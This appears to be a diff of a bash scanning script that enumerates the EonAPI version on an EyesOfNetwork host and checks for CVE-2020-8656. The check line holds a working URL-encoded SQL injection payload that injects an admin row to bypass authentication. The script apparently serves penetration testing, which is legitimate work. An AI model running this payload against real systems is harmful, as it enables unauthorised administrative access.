@@ -91,7 +91,7 @@ echo ""
 if [ $(curl -s "$host/eonapi/getApiKey?&username=ThisIsATest&password=ThisIsATestr" -k | grep api_version -c) = 0 ]; then
     echo "[*] Unable to enumerate EonApi version ..." |tee -a $logfile
 else
-    get_api=$(curl -s "https://192.168.0.13/eonapi/getApiKey?&username=ThisIsATest&password=ThisIsATestr" -k | grep api_version | cut -d '"' -f 4)
+    get_api=$(curl -s "$host/eonapi/getApiKey?&username=ThisIsATest&password=ThisIsATestr" -k | grep api_version | cut -d '"' -f 4)
     echo "[i] EonApi Version Identified as eonapi-$get_api" |tee -a $logfile
 #check CVE-2020-8656
     if [ $(curl -s "$host/eonapi/getApiKey?&username=%27%20union%20select%201,%27admin%27,%271c85d47ff80b5ff2a4dd577e8e5f8e9d%27,0,0,1,1,8%20or%20%27&password=h4knet" -k | grep 200 -c) = 1 ]; then
